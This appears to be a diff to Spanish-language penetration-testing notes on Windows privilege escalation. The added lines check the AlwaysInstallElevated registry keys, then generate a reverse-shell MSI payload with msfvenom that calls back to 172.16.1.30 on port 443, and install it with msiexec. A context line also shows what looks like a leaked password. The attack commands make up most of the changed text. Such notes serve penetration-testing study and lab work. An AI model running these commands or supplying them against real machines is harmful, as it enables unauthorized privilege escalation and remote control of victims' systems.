@@ -75,7 +75,12 @@ icacls <nomnbre archivo/carpeta>
 R4v3nBe5tD3veloP3r\!123
 
 ### AlwaysInstallElevated ###
- Si encontramos tanto el HKLM Y HUCM activado para el AlwaysInstallElvated podemos instalar un archivo .msi malicioso para traernos una reverse shell con el siguiente comando:
+ Si encontramos tanto el HKLM Y HKCU activado para el AlwaysInstallElvated podemos instalar un archivo .msi malicioso para traernos una reverse shell con el siguiente comando:
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi
 
   msiexec /q /i shell.msi
 
